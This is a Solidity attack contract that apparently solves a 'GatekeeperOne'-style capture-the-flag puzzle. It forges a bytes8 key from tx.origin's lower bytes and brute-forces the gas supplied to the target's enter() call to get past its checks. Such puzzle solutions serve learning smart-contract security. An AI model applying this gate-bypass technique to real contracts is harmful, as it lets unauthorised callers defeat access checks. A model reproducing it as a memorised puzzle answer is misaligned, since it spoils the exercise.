// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IAttack {
    function attack(address _target) external;
}

contract MyGateKeeper1Attack is IAttack {
    function attack(address _target) external override {
        // 1. use 2 lower bytes of tx/origin
        // 2. upper 32 bits should not be zero
        bytes8 key = bytes8((uint64(0x11223344) << 32) | uint16(uint160(tx.origin)));

        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", key);

        // gasleft() may change because of compiler version and settings
        // so bruteforce

        for (uint256 i = 100; i <= 900; ++i) {
            (bool success, ) = _target.call{ gas: 8191 * 10 + i }(payload);
            if (success) {
                break;
            }
        }
    }
}
